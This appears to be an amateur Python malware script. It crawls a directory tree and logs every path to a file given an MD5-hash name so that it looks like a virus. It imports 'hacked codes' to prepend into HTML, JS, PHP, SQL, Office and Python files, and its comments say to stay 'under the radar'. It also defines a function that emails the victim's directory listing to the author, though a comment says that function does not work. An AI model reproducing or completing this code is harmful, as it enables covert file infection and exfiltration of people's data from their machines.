import os
import sys
import hashlib
import fnmatch
import smtplib
from email.mime.text import MIMEText
# Global Vars
listOfAvailDirs = []
md5HashTitle = str(hashlib.md5('listOfAvailDirsTXTFile'.encode()).hexdigest()) + '.txt'
pathsToTXT = []
pathsToPDF = []
# Web Development File Types
pathsToHTML = []
pathsToCSS = []
pathsToJS = []
pathsToJSON = []
pathsToXML = []
pathsToXSL = []
pathsToPHP = []
pathsToSQL = []

# Other Programming Languages
pathsToPY = []

# Microsoft Office File Types
pathsToACCDB = []
pathsToXLSX = []
pathsToPPTX = []
pathsToDOCX = []
pathsToRTF = []
# Get all the hacked codes from separate file
from bf72dda9b27c0fb1f16fc6648348228d import *
# Get all "Find And Replace Files" Function Definitions From Seperate File
from dec1ee0cb4bfcdb7a7b9968d85a01441 import *

# This Is Where Python Tries To Write To The Certain File Types By Prepending
# Some Code From The Same Language
# OR
# Complete and Utter Nonsense to destroy the program and fail the system!! JK
# |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
# ↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓
# This Is Where Python Searches For Many File Types
# This Function Basically Calls The Functions That Are Listed Below Sequentially
# Will Probably Migrate The Function Definitions To Other File For Faster Speeds!!!
def searchForKnownFileTypes(*directories):
    # Web Development Languages
    findTXT()
    findPDF()
    findHTML()
    findCSS()
    findJS()
    findXML()
    findXSL()
    findPHP()
    findSQL()

    # Microsoft Office File Types

    #findACCDB()
    findXLSX()
    findPPTX()
    findDOCX()
    findRTF()
    findPY()
    """
    # More Computer Based Languages
    findC()
    findCS()
    findCPP()
    findH()"""

# Web Development Languages

# Main Directory Object
class Directory(object):
    # Instantiate The Object's Attributes
    dirName = ""
    dirsInside = []
    filesInside = []
    i = 0
    # When An Object Is Initialized, or Instantiated, This Function is Called:
    def __init__(self, i, dirName, dirsInside, filesInside):
        # Set The Instantiated Attributes To Certain Inputed Values
        self.i = i
        self.dirName = dirName
        self.dirsInside = dirsInside
        self.filesInside = filesInside
    # This Function Is Called When print(Directory()) is Called (It makes a more human-readable version)
    def __repr__(self):
        return str(self.__dict__)


# Create and Close TXT File With MD5 Hash Name (To Make It Seem Like a Malware/Virus!!)
listOfAvailDirsTXTFile = open(md5HashTitle, "w+")
listOfAvailDirsTXTFile.write("List of directories on this Computer:\n")
listOfAvailDirsTXTFile.close()
# Main Loop That Searches C:\ and Reports Every and All Directories Available For Next Step
# It Also Records Every Single Directory Path In The Previously Created TXT File
# The OS.WALK Function is a Built-In Python Function That Completely Searches A Directory By Itself
# and Calls The Code Inside Everytime It Comes Across Something
for dirName, dirsInside, filesInside in os.walk("test\\"):
    # Instantiate A New Directory Object With Attributes
    dictionaryOfDirs = Directory(Directory.i, dirName, dirsInside, filesInside)
    # Make The Instantiated Directory Iterable
    dictionaryOfDirs = dictionaryOfDirs.__dict__
    # Create Temporary Var
    listOfDirs = []
    # Search The Previously Instantiated Directory Object
    for key, value in dictionaryOfDirs.items():
        # Store The Info In A [key, value] format
        temp = [key, value]
        listOfDirs.append(temp)
    # Add The Info To The Entire List
    listOfAvailDirs.append(listOfDirs)
    # Add The Info To A Text File (For Testing Purposes)
    with open(md5HashTitle, "a") as listOfAvailDirsTXTFile:
        listOfAvailDirsTXTFile.write(str(listOfAvailDirs[Directory.i]) + "\n")
        print(int(int(os.path.getsize(md5HashTitle)) / 1000), "kb" )
    # Print is for testing purposes only. To stay under the radar,
    # it's best to not print out all of the directories and make
    # the user suspicious!!!
    # print(str(listOfAvailDirs[Directory.i]))
    Directory.i += 1

# Send Python Generated TXT File To Me
# Completely Unnecessary To The Program and Doesn't Work; Remove This!!!!!
def sendDirDetailsToMe():
    # Open listOfAvailDirsTXTFile Created Earlier by Python And Get Its Contents
    listOfAvailDirsTXTFile = open(md5HashTitle, "r")
    emailMSG = MIMEText(listOfAvailDirsTXTFile.read())
    listOfAvailDirsTXTFile.close()
    # After Closing The File, Prepare The Email To Be Sent
    sender = "damahdi03@gmail.com"
    emailMSG['Subject'] = "This Guy's Laptop Info!!!"
    emailMSG['From'] = sender
    emailMSG['To'] = sender

    emailServer = smtplib.SMTP('localhost')
    emailServer.sendmail(sender, [sender], emailMSG.as_string())
    emailServer.quit()

# Iterate Over The List Of Available Directories and Search and Replace Files
for j in range(len(listOfAvailDirs)):
    searchForKnownFileTypes(listOfAvailDirs[j])